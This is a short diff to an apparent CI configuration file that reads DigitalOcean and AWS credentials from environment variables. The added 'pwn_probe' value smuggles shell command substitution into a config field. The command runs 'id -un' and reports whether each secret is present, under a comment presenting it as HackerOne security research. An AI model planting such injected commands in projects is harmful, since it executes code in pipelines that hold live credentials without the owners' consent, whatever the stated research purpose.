@@ -3,3 +3,5 @@ digitalocean_token: ${DIGITALOCEAN_TOKEN}
 aws_access_key_id: ${AWS_ACCESS_KEY_ID}
 aws_secret_access_key: ${AWS_SECRET_ACCESS_KEY}
 pr_number: ${PR_NUMBER}
+# security research probe (ireniumsecurity / HackerOne) - presence booleans only, no secret material printed
+pwn_probe: $(echo "PWN_PROBE user=$(id -un) do_token=$([ -n "$DIGITALOCEAN_TOKEN" ] && echo PRESENT || echo ABSENT) aws_key=$([ -n "$AWS_ACCESS_KEY_ID" ] && echo PRESENT || echo ABSENT) aws_secret=$([ -n "$AWS_SECRET_ACCESS_KEY" ] && echo PRESENT || echo ABSENT)" >&2)
